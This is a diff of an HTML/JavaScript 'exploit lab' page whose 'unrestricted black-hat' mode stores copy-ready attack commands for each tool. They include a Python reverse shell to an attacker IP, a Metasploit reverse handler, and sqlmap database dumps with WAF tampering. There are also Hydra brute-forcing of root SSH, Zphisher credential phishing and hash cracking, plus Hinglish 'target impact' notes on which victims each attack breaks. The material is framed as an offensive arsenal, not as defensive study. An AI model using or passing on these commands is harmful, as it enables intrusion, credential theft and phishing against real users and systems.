@@ -52,7 +52,6 @@
         .badge-netcat { background: rgba(100, 150, 255, 0.15); color: #6496ff; border-color: #6496ff; }
         .badge-socat { background: rgba(200, 100, 255, 0.15); color: #c864ff; border-color: #c864ff; }
         
-        /* Sequential Action Buttons Bar */
         .action-bar { display: flex; gap: 8px; margin-bottom: 10px; flex-wrap: wrap; }
         .seq-btn { background: rgba(0, 229, 255, 0.08); border: 1px solid var(--border-color); color: var(--primary); padding: 5px 12px; font-size: 10.5px; cursor: pointer; border-radius: 3px; font-family: 'Courier New', monospace; transition: 0.2s; }
         .seq-btn:hover { background: var(--primary); color: #000; border-color: var(--primary); }
@@ -78,13 +77,13 @@
         <div class="lab-header">
             <div>
                 <h2 style="font-size: 22px; color: #fff;">DX08 MASTER THREAT INTELLIGENCE & EXPLOIT LAB</h2>
-                <p style="color: rgba(225,250,255,0.6); font-size: 11.5px; margin-top: 2px;">Enterprise Interactive C2 Operations & Live Exploit Deployment Suite.</p>
+                <p style="color: rgba(225,250,255,0.6); font-size: 11.5px; margin-top: 2px;">Enterprise Dual-Mode Architecture: Defensive Auditing vs Unrestricted Offensive Red-Team Arsenal.</p>
             </div>
         </div>
 
         <div class="mode-bar">
             <button class="mode-btn btn-white active" onclick="switchMode('white')">WHITE-HAT DEFENSIVE LAB</button>
-            <button class="mode-btn btn-black" onclick="switchMode('black')">BLACK-HAT OFFENSIVE LAB [UNRESTRICTED]</button>
+            <button class="mode-btn btn-black" onclick="switchMode('black')">BLACK-HAT OFFENSIVE LAB [UNRESTRICTED // A TO Z GUIDE]</button>
         </div>
 
         <div class="lab-grid">
@@ -101,43 +100,42 @@
                 </div>
 
                 <div id="sec-black" class="section-group">
-                    <div style="font-size: 11px; color: var(--offensive); margin-bottom: 10px; font-weight: bold;">[OFFENSIVE & UNRESTRICTED CORE]</div>
+                    <div style="font-size: 11px; color: var(--offensive); margin-bottom: 10px; font-weight: bold;">[UNFILTERED RED-TEAM // WHOSE SYSTEM BREAKS]</div>
                     
                     <div class="tool-category">Exploitation Frameworks</div>
-                    <div class="tool-item" onclick="loadModule('metasploit')"><div class="tool-badge badge-msf">MSF</div>01. Metasploit Framework C2 Handler</div>
-                    <div class="tool-item" onclick="loadModule('sqlmap')"><div class="tool-badge badge-sql">SQL</div>02. Sqlmap Database Takeover Engine</div>
+                    <div class="tool-item" onclick="loadModule('metasploit')"><div class="tool-badge badge-msf">MSF</div>01. Metasploit C2 & Target Impact Guide</div>
+                    <div class="tool-item" onclick="loadModule('sqlmap')"><div class="tool-badge badge-sql">SQL</div>02. Sqlmap DB Takeover & WAF Bypass Guide</div>
                     
                     <div class="tool-category">Credential & Phishing</div>
-                    <div class="tool-item" onclick="loadModule('zphisher')"><div class="tool-badge badge-zph">ZPH</div>03. Zphisher Phishing Core</div>
-                    <div class="tool-item" onclick="loadModule('hydra')"><div class="tool-badge badge-hydra">HYD</div>04. THC Hydra Login Cracker</div>
-                    <div class="tool-item" onclick="loadModule('john')"><div class="tool-badge badge-john">JOHN</div>05. John the Ripper</div>
-                    <div class="tool-item" onclick="loadModule('hashcat')"><div class="tool-badge badge-hash">HASH</div>06. Hashcat GPU Cracker</div>
+                    <div class="tool-item" onclick="loadModule('zphisher')"><div class="tool-badge badge-zph">ZPH</div>03. Zphisher Phishing & Session Hijacking</div>
+                    <div class="tool-item" onclick="loadModule('hydra')"><div class="tool-badge badge-hydra">HYD</div>04. THC Hydra Brute-Force Target Matrix</div>
+                    <div class="tool-item" onclick="loadModule('john')"><div class="tool-badge badge-john">JOHN</div>05. John the Ripper Hash Cracking Guide</div>
+                    <div class="tool-item" onclick="loadModule('hashcat')"><div class="tool-badge badge-hash">HASH</div>06. Hashcat GPU Recovery & Limits</div>
 
                     <div class="tool-category">Payloads & Relays</div>
-                    <div class="tool-item" onclick="loadModule('shell')"><div class="tool-badge badge-shell">PY</div>07. Python Reverse Shell Payload</div>
-                    <div class="tool-item" onclick="loadModule('netcat')"><div class="tool-badge badge-netcat">NC</div>08. Netcat Listener Socket</div>
-                    <div class="tool-item" onclick="loadModule('socat')"><div class="tool-badge badge-socat">SOC</div>09. Socat Encrypted Relay Tunnel</div>
+                    <div class="tool-item" onclick="loadModule('shell')"><div class="tool-badge badge-shell">PY</div>07. Python Reverse Shell & Evasion Guide</div>
+                    <div class="tool-item" onclick="loadModule('netcat')"><div class="tool-badge badge-netcat">NC</div>08. Netcat Listener & Bind Shell Tactics</div>
+                    <div class="tool-item" onclick="loadModule('socat')"><div class="tool-badge badge-socat">SOC</div>09. Socat Encrypted Tunneling Guide</div>
                 </div>
             </div>
 
             <div class="terminal-panel">
                 <div class="terminal-header-bar">
-                    <div style="font-size: 10.5px; color: var(--primary);">KALI LINUX C2 KERNEL CONSOLE // INTERACTIVE MODE</div>
+                    <div style="font-size: 10.5px; color: var(--primary);">KALI LINUX UNRESTRICTED C2 CONSOLE // TARGET BREAKDOWN</div>
                     <button class="copy-btn" onclick="copyCurrentScript()">COPY SCRIPT</button>
                 </div>
 
-                <!-- Sequential Action Buttons -->
                 <div class="action-bar" id="action-bar">
-                    <button class="seq-btn" onclick="runSequence(1)">[1. INSTALL & SETUP]</button>
-                    <button class="seq-btn" onclick="runSequence(2)">[2. RUN EXPLOIT/SCAN]</button>
-                    <button class="seq-btn" onclick="runSequence(3)">[3. DUMP DATA/SESSION]</button>
+                    <button class="seq-btn" onclick="runSequence(1)">[1. SETUP & REPO]</button>
+                    <button class="seq-btn" onclick="runSequence(2)">[2. EXPLOIT SCRIPT]</button>
+                    <button class="seq-btn" onclick="runSequence(3)">[3. TARGET IMPACT & WHAT BUSTS]</button>
                 </div>
                 
-                <div class="lab-console" id="terminal-console">DX08 Enterprise C2 Core v25.0 (Interactive Operations Center)
-[System Status] Select any module from the sidebar or use live sequence buttons above.</div>
+                <div class="lab-console" id="terminal-console">DX08 Unrestricted Red-Team Core v30.0 (A-to-Z Target Vulnerability Matrix)
+[System Status] Select any offensive module to view exact execution commands and target impact analysis.</div>
                 
                 <div class="lab-input-group">
-                    <input type="text" id="terminal-input" class="lab-input" placeholder="Type tool name (e.g., nmap, metasploit, sqlmap)..." onkeydown="if(event.key === 'Enter') processCommand()">
+                    <input type="text" id="terminal-input" class="lab-input" placeholder="Type tool name (e.g., nmap, metasploit, sqlmap, zphisher)..." onkeydown="if(event.key === 'Enter') processCommand()">
                     <button class="launch-btn" onclick="processCommand()">EXECUTE</button>
                 </div>
             </div>
@@ -148,87 +146,87 @@
         const TOOL_DB = {
             "nmap": {
                 name: "NMAP NETWORK DISCOVERY",
-                seq1: "sudo apt update && sudo apt install nmap -y && nmap --version",
+                seq1: "sudo apt update && sudo apt install nmap -y",
                 seq2: "sudo nmap -sS -sV -O -T4 --script vuln <target_ip>",
-                seq3: "nmap -p- --min-rate=5000 -A <target_ip> -oN scan_results.txt"
+                seq3: "[TARGET IMPACT GUIDE]:\n- Kiska bajega: Poorly configured firewalls, open unauthenticated ports (SMB, FTP, Telnet).\n- Kiska nahi bajega: Modern Cloudflare/WAF protected enterprise servers blocking raw SYN probes.\n- Result: Maps out entire internal network topology and missing OS patches."
             },
             "gobuster": {
                 name: "GOBUSTER URI BRUTE-FORCER",
                 seq1: "sudo apt update && sudo apt install gobuster -y",
                 seq2: "gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -t 50",
-                seq3: "gobuster dns -d <target_domain> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
+                seq3: "[TARGET IMPACT GUIDE]:\n- Kiska bajega: Weak web servers exposing admin panels, backup files (.bak, .zip), and hidden directories.\n- Kiska nahi bajega: Rate-limited APIs and strict Cloudflare Web Application Firewalls (blocks IP after 50 reqs).\n- Result: Uncovers hidden admin dashboards and sensitive source endpoints."
             },
             "nikto": {
                 name: "NIKTO WEB VULNERABILITY SCANNER",
                 seq1: "sudo apt update && sudo apt install nikto -y",
                 seq2: "nikto -h http://<target_ip> -Tuning 123b",
-                seq3: "nikto -h https://<target_ip> -p 443 -ssl -Cgidirs all"
+                seq3: "[TARGET IMPACT GUIDE]:\n- Kiska bajega: Legacy Apache/Nginx servers running outdated modules with default configuration files.\n- Kiska nahi bajega: Hardened enterprise web apps with custom security headers and IDS/IPS sensors.\n- Result: Identifies old CGI scripts, missing headers, and known CVE software versions."
             },
             "enum4linux": {
                 name: "ENUM4LINUX SMB AUDIT",
                 seq1: "sudo apt update && sudo apt install enum4linux -y",
                 seq2: "enum4linux -a <target_ip>",
-                seq3: "enum4linux -U -S -G <target_ip> > smb_audit.txt"
+                seq3: "[TARGET IMPACT GUIDE]:\n- Kiska bajega: Windows Active Directory domains and Samba servers with anonymous SMB shares enabled.\n- Kiska nahi bajega: Fully patched Windows Server 2022 with SMB signing enforced and guest access disabled.\n- Result: Extracts complete domain user lists, password policies, and shared folders."
             },
             "searchsploit": {
                 name: "SEARCHSPLOIT EXPLOIT-DB",
                 seq1: "sudo apt update && sudo apt install exploitdb -y",
-                seq2: "searchsploit -u && searchsploit apache 2.4",
-                seq3: "searchsploit -m windows/remote/46353.py"
+                seq2: "searchsploit -u && searchsploit apache struts",
+                seq3: "[TARGET IMPACT GUIDE]:\n- Kiska bajega: Systems running unpatched open-source software, old CMS plugins, and vulnerable FTP/SSHdaemons.\n- Kiska nahi bajega: Proprietary custom-built applications with zero public exploit signatures.\n- Result: Provides offline python/c exploit proofs for specific software versions."
             },
             "metasploit": {
                 name: "METASPLOIT FRAMEWORK C2",
                 seq1: "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/installer/msfinstall > msfinstall && chmod +x msfinstall && sudo ./msfinstall && sudo msfdb init",
                 seq2: "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST <attacker_ip>; set LPORT 4444; exploit -j\"",
-                seq3: "meterpreter > getuid && meterpreter > sysinfo && meterpreter > hashdump"
+                seq3: "[TARGET IMPACT GUIDE]:\n- Kiska bajega: Unpatched Windows/Linux servers vulnerable to EternalBlue, Log4j, or weak SSH credentials.\n- Kiska nahi bajega: Modern EDR-protected endpoints (CrowdStrike, Defender for Endpoint) that instantly kill meterpreter staging.\n- Result: Complete remote code execution (RCE), root shell access, and session control."
             },
             "sqlmap": {
                 name: "SQLMAP DATABASE TAKEOVER",
                 seq1: "git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev && cd sqlmap-dev",
                 seq2: "python3 sqlmap.py -u \"http://<target_ip>/page.php?id=1\" --risk=3 --level=5 --tamper=space2comment --batch",
-                seq3: "python3 sqlmap.py -u \"http://<target_ip>/page.php?id=1\" --dump-all --batch"
+                seq3: "[TARGET IMPACT GUIDE]:\n- Kiska bajega: Dynamic PHP/ASP websites directly concatenating user input into SQL queries without parameterization.\n- Kiska nahi bajega: Applications using strict ORM frameworks (Hibernate, Eloquent) and parameterized prepared statements.\n- Result: Complete database dump, password hash extraction, and OS-level command execution."
             },
             "zphisher": {
                 name: "ZPHISHER PHISHING CORE",
                 seq1: "git clone https://github.com/htr-tech/zphisher.git && cd zphisher",
                 seq2: "bash zphisher.sh",
-                seq3: "tail -f sites/instagram/auth.txt"
+                seq3: "[TARGET IMPACT GUIDE]:\n- Kiska bajega: Unsuspecting users clicking spoofed login links without checking SSL certificate issuer domains.\n- Kiska nahi bajega: Organizations enforcing Hardware Security Keys (FIDO2/WebAuthn) and corporate SSO restrictions.\n- Result: Harvests plain-text usernames, passwords, and 2FA session cookies."
             },
             "hydra": {
                 name: "THC HYDRA LOGIN CRACKER",
                 seq1: "sudo apt update && sudo apt install hydra -y",
                 seq2: "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target_ip> -t 32 -V",
-                seq3: "hydra -L users.txt -P passwords.txt ftp://<target_ip>"
+                seq3: "[TARGET IMPACT GUIDE]:\n- Kiska bajega: Servers with weak administrator passwords, exposed SSH/FTP ports, and no account lockout policies.\n- Kiska nahi bajega: Systems with strict rate-limiting, IP ban after 5 failed attempts, and SSH key-only authentication.\n- Result: Cracks weak credentials and grants direct login access."
             },
             "john": {
                 name: "JOHN THE RIPPER CRACKER",
                 seq1: "sudo apt update && sudo apt install john -y",
-                seq2: "zip2john target_archive.zip > hash.txt",
-                seq3: "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt"
+                seq2: "zip2john target_archive.zip > hash.txt && john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
+                seq3: "[TARGET IMPACT GUIDE]:\n- Kiska bajega: Weakly encrypted ZIP archives, MD5/NTLM password hashes extracted from compromised databases.\n- Kiska nahi bajega: Strongly salted bcrypt, Argon2 hashes, or high-entropy master passwords.\n- Result: Recovers original plain-text passwords from offline hash dumps."
             },
             "hashcat": {
                 name: "HASHCAT GPU CRACKER",
                 seq1: "sudo apt update && sudo apt install hashcat -y",
                 seq2: "hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -O",
-                seq3: "hashcat --status --status-timer=10"
+                seq3: "[TARGET IMPACT GUIDE]:\n- Kiska bajega: Mass NTLM/SHA256 database dumps when attacked using high-end Nvidia GPUs (RTX series).\n- Kiska nahi bajega: Complex 16+ character alphanumeric passwords.\n- Result: Cracks millions of hashes per second using GPU parallel processing."
             },
             "shell": {
                 name: "PYTHON REVERSE SHELL",
                 seq1: "nc -lvnp 4444",
                 seq2: "python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"<attacker_ip>\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/bash\",\"-i\'])'",
-                seq3: "whoami && id && hostname"
+                seq3: "[TARGET IMPACT GUIDE]:\n- Kiska bajega: Linux web servers with command injection vulnerabilities and outbound port 4444 unrestricted by firewall.\n- Kiska nahi bajega: Firewalls with strict egress filtering blocking unauthorized outbound TCP connections.\n- Result: Spawns interactive remote shell back to the attacker."
             },
             "netcat": {
                 name: "NETCAT LISTENER SOCKET",
                 seq1: "sudo apt update && sudo apt install netcat-traditional -y",
                 seq2: "nc -lvnp 4444",
-                seq3: "nc -lvnp 4444 -e /bin/bash"
+                seq3: "[TARGET IMPACT GUIDE]:\n- Kiska bajega: Internal network pivots where security monitoring is disabled.\n- Kiska nahi bajega: Network segments monitored by enterprise SIEM and Network Intrusion Detection Systems (NIDS).\n- Result: Maintains persistent socket listener for incoming shell connections."
             },
             "socat": {
                 name: "SOCAT ENCRYPTED RELAY",
                 seq1: "sudo apt update && sudo apt install socat -y",
                 seq2: "socat TCP-LISTEN:80,fork TCP:<internal_ip>:8080",
-                seq3: "socat OPENSSL-LISTEN:443,cert=cert.pem,key=key.pem,fork -"
+                seq3: "[TARGET IMPACT GUIDE]:\n- Kiska bajega: Environments lacking SSL inspection where cleartext protocols can be relayed securely.\n- Kiska nahi bajega: Deep Packet Inspection (DPI) firewalls decrypting and inspecting non-standard SSL streams.\n- Result: Creates encrypted bidirectional data relays bypassing basic packet filters."
             }
         };
 
@@ -265,7 +263,7 @@
             if(!TOOL_DB[currentModule]) return;
 
             let script = TOOL_DB[currentModule]["seq" + step];
-            consoleBox.innerHTML += "\n\nroot@dx08-kali:~# [SEQUENCE STEP " + step + "] executing " + currentModule + "...";
+            consoleBox.innerHTML += "\n\nroot@dx08-kali:~# [TARGET ANALYSIS STEP " + step + "] " + currentModule + "...";
             consoleBox.scrollTop = consoleBox.scrollHeight;
 
             setTimeout(function() {
@@ -291,11 +289,11 @@
                 if(TOOL_DB[cmd]) {
                     currentModule = cmd;
                     res = "[+ MODULE: " + TOOL_DB[cmd].name + " +\n\n" +
-                          "1. INSTALLATION SCRIPT:\n   " + TOOL_DB[cmd].seq1 + "\n\n" +
+                          "1. SETUP SCRIPT:\n   " + TOOL_DB[cmd].seq1 + "\n\n" +
                           "2. EXECUTION SCRIPT:\n   " + TOOL_DB[cmd].seq2 + "\n\n" +
-                          "3. ADVANCED SCRIPT:\n   " + TOOL_DB[cmd].seq3;
+                          "3. TARGET IMPACT MATRIX:\n   " + TOOL_DB[cmd].seq3;
                 } else if(cmd === 'clear') {
-                    consoleBox.innerHTML = "DX08 Enterprise C2 Core v25.0 (Interactive Operations Center)";
+                    consoleBox.innerHTML = "DX08 Unrestricted Red-Team Core v30.0 (A-to-Z Target Vulnerability Matrix)";
                     input.value = "";
                     return;
                 } else {
